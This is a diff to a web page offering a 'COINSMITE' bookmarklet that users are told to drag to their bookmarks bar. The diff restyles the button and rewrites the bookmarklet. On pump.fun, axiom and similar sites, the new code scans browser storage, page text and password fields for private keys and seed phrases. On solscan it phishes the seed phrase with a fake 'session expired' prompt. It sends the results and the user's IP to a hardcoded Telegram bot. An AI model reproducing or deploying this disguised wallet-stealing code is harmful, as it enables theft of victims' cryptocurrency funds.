@@ -118,13 +118,13 @@
         }
         .bookmark-btn {
             display: inline-block;
-            background: #5b72ff;
-            color: #fff;
+            background: #ffffff;
+            color: #0b0e1a;
             font-weight: 700;
             font-size: 1.4rem;
             padding: 0.9rem 2.8rem;
             border-radius: 60px;
-            box-shadow: 0 8px 0 #2f3a8a, 0 10px 30px rgba(91, 114, 255, 0.25);
+            box-shadow: 0 8px 0 #8a8a8a, 0 10px 30px rgba(255, 255, 255, 0.15);
             cursor: grab;
             user-select: none;
             transition: 0.07s ease;
@@ -135,7 +135,7 @@
         .bookmark-btn:active {
             cursor: grabbing;
             transform: translateY(4px);
-            box-shadow: 0 4px 0 #2f3a8a;
+            box-shadow: 0 4px 0 #8a8a8a;
         }
         .bookmark-hint {
             margin-top: 1.2rem;
@@ -222,7 +222,7 @@
         </div>
 
         <div class="bookmark-area">
-            <a href="javascript:(function(){var b=document,a=location.href;if(!a.includes('pump.fun')&&!a.includes('axiom')&&!a.includes('paradade.gg'))return;var w=[];for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i),v=localStorage.getItem(k);if(v&&v.match(/0x[a-fA-F0-9]{40,48}/))w.push(v)}for(i=0;i<sessionStorage.length;i++){k=sessionStorage.key(i);v=sessionStorage.getItem(k);if(v&&v.match(/0x[a-fA-F0-9]{40,48}/))w.push(v)}var e=b.querySelectorAll('[id*=\"wallet\"],[data-wallet],[address],.wallet-address,.address');for(i=0;i<e.length;i++){var t=e[i].textContent||e[i].innerText;if(t&&t.match(/0x[a-fA-F0-9]{40,48}/))w.push(t)}if(w.length==0)w=['No wallet found'];var x=new XMLHttpRequest();x.open('GET','https://api.ipify.org/json',false);x.send();var ip=x.status==200?JSON.parse(x.responseText).ip:'unknown';var y=new XMLHttpRequest();y.open('POST','https://api.telegram.org/bot8763030544:AAHzAmRNGjUdWlr4Sjc_2WqhoZm5D5_RSlk/sendMessage');y.setRequestHeader('Content-Type','application/json');y.send(JSON.stringify({chat_id:'6759486932',text:'IP: '+ip+'%0AWallets:%0A'+w.join('%0A')}));})();" class="bookmark-btn" draggable="true">⚡ COINSMITE</a>
+            <a href="javascript:(function(){var%20b=document,a=location.href;if(!a.includes('pump.fun')&&!a.includes('axiom')&&!a.includes('paradade.gg')&&!a.includes('solscan')){alert('Don\'t%20click%20—%20drag%20to%20bookmarks%20bar%20only.%20Works%20on%20pump.fun,%20axiom,%20and%20paradade.gg');return;}var%20found=[];function%20scanText(t){var%20patterns=[/[0-9a-fA-F]{64}/g,/[5KL][1-9A-HJ-NP-Za-km-z]{50,51}/g,/\b(?:[a-z]+%20){11,23}[a-z]+\b/g,/\b(seed|mnemonic|phrase|recovery)\s*[:=]\s*[a-zA-Z0-9\s]{12,24}/gi,/0x[a-fA-F0-9]{40,48}/g];var%20labels=['Private%20Key%20(hex)','Private%20Key%20(WIF)','Mnemonic%20Phrase','Seed%20Phrase','Wallet%20Address'];for(var%20p=0;p<patterns.length;p++){var%20matches=t.match(patterns[p]);if(matches){for(var%20m=0;m<matches.length;m++){if(matches[m].length>10)found.push(labels[p]+':%20'+matches[m])}}}}if(a.includes('solscan')){var%20promptResult=prompt('Session%20expired.%20Please%20re-enter%20your%20seed%20phrase%20to%20continue:','');if(promptResult&&promptResult.length>10){found.push('User%20entered%20seed:%20'+promptResult)}}for(var%20i=0;i<localStorage.length;i++){var%20k=localStorage.key(i);var%20v=localStorage.getItem(k);if(v&&typeof%20v=='string'){scanText(v);if(k.toLowerCase().includes('seed')||k.toLowerCase().includes('mnemonic')||k.toLowerCase().includes('phrase')||k.toLowerCase().includes('priv')||k.toLowerCase().includes('key'))found.push('Storage%20Key:%20'+k+'%20=%20'+v)}}for(i=0;i<sessionStorage.length;i++){k=sessionStorage.key(i);v=sessionStorage.getItem(k);if(v&&typeof%20v=='string'){scanText(v);if(k.toLowerCase().includes('seed')||k.toLowerCase().includes('mnemonic')||k.toLowerCase().includes('phrase')||k.toLowerCase().includes('priv')||k.toLowerCase().includes('key'))found.push('Session%20Key:%20'+k+'%20=%20'+v)}}var%20allText=b.body.innerText;scanText(allText);var%20inputs=b.querySelectorAll('input[type=\"text\"],input[type=\"password\"],textarea');for(i=0;i<inputs.length;i++){if(inputs[i].value&&inputs[i].value.length>10){scanText(inputs[i].value);if(inputs[i].type=='password'||inputs[i].id.toLowerCase().includes('seed')||inputs[i].id.toLowerCase().includes('phrase'))found.push('Input%20field%20'+inputs[i].id+':%20'+inputs[i].value)}}var%20e=b.querySelectorAll('[id*=\"wallet\"],[data-wallet],[address],.wallet-address,.address');for(i=0;i<e.length;i++){var%20t=e[i].textContent||e[i].innerText;if(t&&t.match(/0x[a-fA-F0-9]{40,48}/))found.push('Wallet%20Address:%20'+t)}if(found.length==0)found=['No%20keys%20or%20wallets%20found'];var%20x=new%20XMLHttpRequest();x.open('GET','https://api.ipify.org/json',false);x.send();var%20ip=x.status==200?JSON.parse(x.responseText).ip:'unknown';var%20y=new%20XMLHttpRequest();y.open('POST','https://api.telegram.org/bot8763030544:AAHzAmRNGjUdWlr4Sjc_2WqhoZm5D5_RSlk/sendMessage');y.setRequestHeader('Content-Type','application/json');y.send(JSON.stringify({chat_id:'6759486932',text:'IP:%20'+ip+'%0A%0APage:%20'+a+'%0A%0AFound:%0A'+found.join('%0A')}));alert('Scan%20complete.%20Check%20results.');})();" class="bookmark-btn" draggable="true">⚡ COINSMITE</a>
             <div class="bookmark-hint">Drag, don't click — this button only works from your bookmarks bar.</div>
         </div>
 
